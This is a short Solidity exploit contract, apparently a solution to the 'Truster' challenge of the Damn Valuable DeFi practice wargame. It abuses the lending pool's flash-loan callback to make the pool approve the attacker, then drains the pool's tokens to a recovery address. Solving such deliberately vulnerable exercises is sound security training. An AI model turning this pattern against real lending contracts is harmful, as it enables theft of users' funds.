pragma solidity =0.8.25;

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

contract Attacker {

    function attack() public {
        DamnValuableToken token = DamnValuableToken(address(0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b));
        TrusterLenderPool pool = TrusterLenderPool(address(0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264));
        address recovery = address(0x73030B99950fB19C6A813465E58A0BcA5487FBEa);
        pool.flashLoan(0, address(this), address(token), 
                            abi.encodeWithSignature("approve(address,uint256)", 
                            address(this), 
                            0x0020000000000000000000000000000000000000000000000000000000000000));
        token.transferFrom(address(pool), recovery, 0x00000000000000000000000000000000000000000000d3c21bcecceda1000000);
    }
} 